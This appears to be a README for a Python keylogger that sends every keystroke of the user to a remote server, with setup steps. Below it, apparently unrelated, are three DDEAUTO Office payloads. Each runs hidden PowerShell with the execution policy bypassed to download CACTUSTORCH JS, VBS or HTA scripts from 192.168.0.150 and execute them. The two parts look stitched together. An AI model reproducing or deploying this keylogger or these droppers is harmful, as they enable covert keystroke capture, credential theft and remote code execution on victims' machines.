# Keylogger
Keylogger made in Python using xlib,pyxhook,sockets,multi-threading which will send all keystrokes of the user to a remote server and if the server is offline it will save them to a file.


# HOW TO USE

1. Open the **keylogger.py** file and edit the file path and host name if you want to host the server on different machine.
2. Do the same for **server.py** file.
3. Run **server.py** and then **keylogger.py**.



---------------------------
JS PAYLOAD:
DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -w hidden -nop -ep bypass -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.0.150/CACTUSTORCH.js','index.js'); & start c:\\Windows\\System32\\cmd.exe /c cscript.exe index.js"

VBS PAYLOAD:
DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -w hidden -nop -ep bypass -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.0.150/CACTUSTORCH.vbs','index.vbs'); & start c:\\Windows\\System32\\cmd.exe /c cscript.exe index.vbs"

HTA PAYLOAD:
DDEAUTO C:\\Programs\\Microsoft\\Office\\MSword.exe\\..\\..\\..\\..\\windows\\system32\\mshta.exe "http://192.168.0.150/CACTUSTORCH.hta"

-----------------------------
